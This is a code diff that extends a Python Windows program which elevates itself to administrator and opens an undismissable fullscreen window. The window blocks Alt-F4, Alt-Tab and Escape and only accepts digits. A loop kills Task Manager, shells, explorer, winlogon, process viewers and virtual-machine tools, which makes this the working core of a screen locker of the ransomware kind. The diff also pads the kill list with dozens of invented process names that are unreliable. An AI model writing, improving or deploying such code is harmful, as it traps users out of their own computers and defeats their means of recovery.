@@ -22,9 +22,16 @@ class a:
             except:
                 is_admin = False
             if not is_admin:
-                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, '"' + os.path.abspath(__file__) + '"', None, 1)
+                params = '"' + os.path.abspath(__file__) + '"'
+                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
                 os._exit(0)
         self.b = tk.Tk()
+        self.b.protocol("WM_DELETE_WINDOW", lambda: None)
+        self.b.bind('<Alt-F4>', lambda e: "break")
+        self.b.bind('<Control-Alt-Delete>', lambda e: "break")
+        self.b.bind('<Alt-Tab>', lambda e: "break")
+        self.b.bind('<Escape>', lambda e: "break")
+        self.b.bind('<FocusOut>', lambda e: self.b.focus_force())
         self.c()
         self.d()
         self.e()
@@ -57,16 +64,36 @@ class a:
         c = wmi.WMI()
         block_names = [
             'taskmgr.exe', 'cmd.exe', 'powershell.exe', 'regedit.exe', 'conhost.exe',
-            'ProcessHacker.exe', 'procexp.exe', 'procexp64.exe', 'explorer.exe',
+            'processhacker.exe', 'processhacker-2.39.exe', 'processhacker-2.39.124.exe',
+            'procexp.exe', 'procexp64.exe', 'explorer.exe',
             'rdpclip.exe', 'mstsc.exe', 'vds.exe', 'VirtualDesktopAccessor.exe',
-            'VBoxTray.exe', 'vmtoolsd.exe'
+            'VBoxTray.exe', 'vmtoolsd.exe', 'userinit.exe', 'winlogon.exe', 'taskview.exe',
+            'taskviewhost.exe', 'taskviewhost64.exe', 'taskviewhost32.exe', 'taskviewhostarm.exe',
+            'taskviewhostarm64.exe', 'taskviewhostarm32.exe', 'taskviewhostarmv7.exe',
+            'taskviewhostarmv8.exe', 'taskviewhostarmv6.exe', 'taskviewhostarmv5.exe',
+            'taskviewhostarmv4.exe', 'taskviewhostarmv3.exe', 'taskviewhostarmv2.exe',
+            'taskviewhostarmv1.exe', 'taskviewhostarmv0.exe', 'taskviewhostarmv9.exe',
+            'taskviewhostarmv10.exe', 'taskviewhostarmv11.exe', 'taskviewhostarmv12.exe',
+            'taskviewhostarmv13.exe', 'taskviewhostarmv14.exe', 'taskviewhostarmv15.exe',
+            'taskviewhostarmv16.exe', 'taskviewhostarmv17.exe', 'taskviewhostarmv18.exe',
+            'taskviewhostarmv19.exe', 'taskviewhostarmv20.exe', 'taskviewhostarmv21.exe',
+            'taskviewhostarmv22.exe', 'taskviewhostarmv23.exe', 'taskviewhostarmv24.exe',
+            'taskviewhostarmv25.exe', 'taskviewhostarmv26.exe', 'taskviewhostarmv27.exe',
+            'taskviewhostarmv28.exe', 'taskviewhostarmv29.exe', 'taskviewhostarmv30.exe',
+            'taskviewhostarmv31.exe', 'taskviewhostarmv32.exe', 'taskviewhostarmv33.exe',
+            'taskviewhostarmv34.exe', 'taskviewhostarmv35.exe', 'taskviewhostarmv36.exe',
+            'taskviewhostarmv37.exe', 'taskviewhostarmv38.exe', 'taskviewhostarmv39.exe',
+            'taskviewhostarmv40.exe', 'taskviewhostarmv41.exe', 'taskviewhostarmv42.exe',
+            'taskviewhostarmv43.exe', 'taskviewhostarmv44.exe', 'taskviewhostarmv45.exe',
+            'taskviewhostarmv46.exe', 'taskviewhostarmv47.exe', 'taskviewhostarmv48.exe',
+            'taskviewhostarmv49.exe', 'taskviewhostarmv50.exe',
         ]
         while True:
             try:
                 for process in c.Win32_Process():
                     try:
                         pname = process.Name.lower() if process.Name else ''
-                        if pname in block_names or 'desktop' in pname or 'vds' in pname or 'virtual' in pname or 'vbox' in pname or 'vmtool' in pname:
+                        if pname in block_names or 'desktop' in pname or 'vds' in pname or 'virtual' in pname or 'vbox' in pname or 'vmtool' in pname or 'taskview' in pname:
                             os.kill(int(process.ProcessId), 9)
                     except Exception:
                         pass
@@ -97,19 +124,16 @@ class a:
         self.b.attributes('-fullscreen', True)
         self.b.attributes('-topmost', True)
         self.b.protocol("WM_DELETE_WINDOW", lambda: None)
-        for key in [
-            'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',
-            'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z',
-            'F1','F2','F3','F4','F5','F6','F7','F8','F9','F10','F11','F12',
-            'Tab','Caps_Lock','Shift_L','Shift_R','Control_L','Control_R','Alt_L','Alt_R','Super_L','Super_R',
-            'Insert','Delete','Home','End','Prior','Next','Page_Up','Page_Down','Up','Down','Left','Right',
-            'Escape','Return','BackSpace','space','minus','equal','bracketleft','bracketright','backslash','semicolon','apostrophe','comma','period','slash','grave',
-            'Num_Lock','Scroll_Lock','Pause','Print','Menu','KP_0','KP_1','KP_2','KP_3','KP_4','KP_5','KP_6','KP_7','KP_8','KP_9','KP_Decimal','KP_Divide','KP_Multiply','KP_Subtract','KP_Add','KP_Enter','KP_Separator']:
-            self.b.bind(f'<KeyPress-{key}>', lambda e: "break")
-        self.b.bind('<Alt-F4>', lambda e: None)
-        self.b.bind('<Control-Alt-Delete>', lambda e: None)
-        self.b.bind('<Alt-Tab>', lambda e: None)
-        self.b.bind('<Escape>', lambda e: None)
+        allowed = ['0','1','2','3','4','5','6','7','8','9']
+        def only_digits(event):
+            if event.char not in allowed:
+                return "break"
+        self.b.bind_all('<Key>', only_digits, add='+')
+        self.b.bind('<Alt-F4>', lambda e: "break")
+        self.b.bind('<Control-Alt-Delete>', lambda e: "break")
+        self.b.bind('<Alt-Tab>', lambda e: "break")
+        self.b.bind('<Escape>', lambda e: "break")
+        self.b.bind('<FocusOut>', lambda e: self.b.focus_force())
         self.b.bind('<Alt-Shift-KeyPress-c>', self.j)
         self.b.bind('<Alt-Shift-KeyPress-C>', self.j)
         self.b.focus_force()
